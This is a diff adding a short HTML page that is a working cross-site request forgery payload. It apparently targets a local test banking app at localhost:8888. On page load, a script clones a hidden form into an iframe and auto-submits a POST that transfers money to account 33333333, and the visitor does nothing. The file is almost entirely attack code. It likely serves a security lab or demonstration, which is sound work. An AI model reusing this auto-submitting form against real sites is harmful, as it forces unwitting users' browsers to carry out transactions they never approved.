@@ -1,0 +1,21 @@
+<html>
+<body>
+<form id="form1" target="_self" action="http://localhost:8888/transfer.php" method="POST">
+<input type="hidden" name="action" value="transfer"/>
+<input type="hidden" name="to" value="33333333"/>
+<input type="hidden" name="amount" value="1"/>
+</form>
+<iframe id="iframe1">
+</iframe>
+<script>
+window.onload=function(){
+	var form = document.getElementById("form1");
+	var clone = form.cloneNode(true);
+	var iframe = document.getElementById("iframe1");
+	var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+	innerDoc.appendChild(clone);
+	innerDoc.getElementById("form1").submit();
+}
+</script>
+</body>
+</html>
